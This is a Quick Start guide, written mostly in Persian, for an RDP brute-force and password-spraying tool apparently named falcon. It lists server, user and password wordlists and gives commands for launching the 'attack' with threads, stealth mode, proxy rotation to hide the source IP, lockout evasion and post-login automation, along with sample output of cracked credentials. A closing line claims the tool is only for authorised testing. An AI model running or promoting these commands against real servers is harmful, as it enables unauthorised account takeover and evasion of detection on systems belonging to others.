# Quick Start Guide - سریع‌ترین شروع

## 📥 نصب سریع

### Linux/macOS
```bash
git clone https://github.com/drjyhpaz/new_falcon.git
cd new_falcon
chmod +x install.sh
./install.sh
```

### Windows
```cmd
git clone https://github.com/drjyhpaz/new_falcon.git
cd new_falcon
go mod download
go build -o falcon.exe main.go
```

## 📝 فایل‌های مورد نیاز

### servers.txt
```
192.168.1.100:3389
192.168.1.101:3389
```

### users.txt
```
admin
administrator
guest
```

### passwords.txt
```
Password123
Admin@123
```

## 🚀 شرو�� سریع

### 1. تولید Credentials
```bash
./falcon --generate --users users.txt --passwords passwords.txt
```

### 2. شروع حمله (Basic)
```bash
./falcon --servers servers.txt --users users.txt --passwords passwords.txt
```

### 3. با تنظیمات پیشرفته
```bash
./falcon --servers servers.txt --users users.txt --passwords passwords.txt \\
  --threads 32 --timeout 15 --stealth
```

### 4. با Proxy
```bash
echo "socks5://proxy.com:1080" > proxies.txt
./falcon --servers servers.txt --users users.txt --passwords passwords.txt \\
  --proxy --proxy-file proxies.txt
```

### 5. Mode Interactive
```bash
./falcon --interactive
# سپس:
# > load servers servers.txt
# > load users users.txt
# > load passwords passwords.txt
# > set threads 32
# > run
```

## 📊 خروجی‌های مورد انتظار

```
🟢 SUCCESS: admin:Password123@192.168.1.100:3389
🔴 FAILED: guest:Admin@123@192.168.1.101:3389 - Connection timeout
🟡 SKIPPED: root:Password123@192.168.1.102:3389 - Locked out
```

## 🎯 نکات مهم

- ✅ **Password Spraying** برای امنیت بیشتر (یک رمز برای همه)
- ✅ **Stealth Mode** برای اجتناب از تشخیص
- ✅ **Proxy Rotation** برای تغییر IP
- ✅ **Lockout Prevention** خودکار
- ✅ **Resume Support** برای ادامه از جایی که قطع شد

## 🔧 دستورات مفید

```bash
# نمایش ورژن
./falcon --version

# کمک
./falcon --help

# Resume از checkpoint
./falcon --resume

# فعال‌سازی Post-Login Automation
./falcon --postlogin
```

## 📋 Troubleshooting

**خطای Connection Timeout:**
```bash
./falcon --timeout 30  # افزایش timeout به 30 ثانیه
```

**استفاده بیش از حد حافظه:**
```bash
./falcon --threads 8  # کاهش تعداد threads
```

**Permission Denied:**
```bash
chmod 644 servers.txt users.txt passwords.txt
```

## 📖 منابع بیشتر

- 📚 [Documentation](DOCUMENTATION.md)
- 🗺️ [Roadmap](ROADMAP.md)
- 🤝 [Contributing](CONTRIBUTING.md)
- 🐛 [Issues](https://github.com/drjyhpaz/new_falcon/issues)

---

**نکته:** این ابزار فقط برای آزمون امنیتی مجاز به‌کار می‌رود. استفاده غیرمجاز قانونی نیست.
